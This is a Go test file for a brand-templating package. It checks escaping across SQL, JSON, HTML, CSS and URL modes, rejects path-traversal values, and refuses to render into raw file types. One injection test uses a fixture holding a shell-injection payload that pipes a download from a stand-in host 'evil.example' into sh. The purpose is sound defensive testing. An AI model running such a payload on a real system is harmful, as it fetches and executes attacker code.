package brand

import (
	"net/url"
	"strings"
	"testing"
)

func TestRenderModes(t *testing.T) {
	k := &Kit{Slug: "larkspur", Name: `O'Hare & "Sons" <b>`, Domain: "larkspur.example", Primary: "#0F62FE", Assets: map[string]Asset{"logo": {File: "logo.png"}}}
	v := Context(k, "", "", "", "", "")
	cases := []struct {
		mode Mode
		in   string
		want string
	}{
		{SQL, "INSERT INTO s VALUES ({{brand.name}})", `INSERT INTO s VALUES ('O''Hare & "Sons" <b>')`},
		{JSON, `{"n":"{{brand.name}}"}`, `{"n":"O'Hare \u0026 \"Sons\" \u003cb\u003e"}`},
		{HTML, "<h1>{{ brand.name }}</h1>", "<h1>O&#39;Hare &amp; &#34;Sons&#34; &lt;b&gt;</h1>"},
		{CSS, `content:"{{brand.name}}";color:{{brand.primary}}`, `content:"O\000027Hare & \000022Sons\000022 \00003cb\00003e";color:#0f62fe`},
		{URL, "/q?c={{brand.name}}", "/q?c=O%27Hare+%26+%22Sons%22+%3Cb%3E"},
		{Raw, "{{brand.slug}}/{{brand.logo}}", "larkspur/logo.png"},
	}
	for _, c := range cases {
		got, err := v.Render(c.in, c.mode)
		if err != nil || got != c.want {
			t.Errorf("mode %d: got %q want %q (%v)", c.mode, got, c.want, err)
		}
	}
	if got, err := v.Render("/srv/brand/{{brand.slug}}/{{brand.logo}}", Path); err != nil || got != "/srv/brand/larkspur/logo.png" {
		t.Fatalf("path: %q %v", got, err)
	}
	for _, name := range []string{"../../etc", "a/b", ".hidden", "x\\y", ""} {
		pv := Values{"name": name}
		if _, err := pv.Render("/srv/{{brand.name}}/x", Path); err == nil {
			t.Errorf("unsafe path value %q accepted", name)
		}
	}
	if _, err := v.Render("{{brand.nmae}}", Raw); err == nil || !strings.Contains(err.Error(), "brand.nmae") {
		t.Fatalf("typo: %v", err)
	}
	if v["accent"] != Shade("#0f62fe", 0.72) {
		t.Fatalf("accent derived: %q", v["accent"])
	}
	env := v.Env()
	if env["GREENROOM_BRAND_NAME"] != k.Name || env["GREENROOM_BRAND_LOGO"] != "logo.png" {
		t.Fatalf("env: %v", env)
	}
}

func TestContextHouseDefaults(t *testing.T) {
	v := Context(nil, "Acme\\ demo", "Ready\nfor calls", "", "not-a-color", "")
	if v["name"] != "Acme demo" || v["tagline"] != "Ready for calls" || v["primary"] != DefaultPrimary || v["accent"] != DefaultAccent || v["slug"] != "default" || v["logo"] != "" {
		t.Fatalf("house defaults: %v", v)
	}
	mode := func(name string) Mode { m, _ := ModeForFile(name); return m }
	if mode("/srv/brand/brand.css") != CSS || mode("x.HTML") != HTML || mode("a.js") != JSON || mode("seed.sql") != SQL {
		t.Fatal("mode for file")
	}
	if _, ok := ModeForFile("notes"); ok {
		t.Fatal("a file with no extension has a mode")
	}
}

// A name fetched from a prospect's site lands in file content. A file type
// with no escaping mode must fail the render, not insert it raw.
func TestRenderFileRefusesRawTypes(t *testing.T) {
	base, _ := url.Parse("https://evil.example/")
	p := ParsePage(base, []byte(`<html><head><title>Acme $(curl -s evil.example/x|sh) `+"`id`"+`; name: [x]</title></head></html>`))
	v := Context(&Kit{Slug: "evil", Name: p.Name, Domain: "evil.example"}, "", "", "", "", "")
	for _, f := range []string{"seed.sh", "app.env", "compose.yml", "compose.yaml", "default.conf", "seed.py", "notes.txt", "README.md", "Dockerfile", "/srv/x/run"} {
		out, err := v.RenderFile("echo {{brand.name}}", f)
		if err == nil || !strings.Contains(err.Error(), "GREENROOM_BRAND_") || !strings.Contains(err.Error(), ".json") {
			t.Errorf("%s: rendered %q (%v)", f, out, err)
		}
	}
	if out, err := v.RenderFile("echo plain", "seed.sh"); err != nil || out != "echo plain" {
		t.Fatalf("a file without placeholders: %q %v", out, err)
	}
	for _, f := range []string{"app.js", "data.json", "mod.mjs"} {
		out, err := v.RenderFile("const n = `{{brand.name}}`;", f)
		if err != nil || strings.Contains(out[11:len(out)-2], "`") || strings.Contains(out, "$(") ||
			!strings.Contains(out, `\u0060id`) || !strings.Contains(out, `\u0024(curl`) {
			t.Errorf("%s: template literal break out: %q %v", f, out, err)
		}
	}
	if out, err := v.Render("{{brand.name}}", Raw); err != nil || !strings.Contains(out, "$(curl") {
		t.Fatalf("argv stays raw: %q %v", out, err)
	}
}
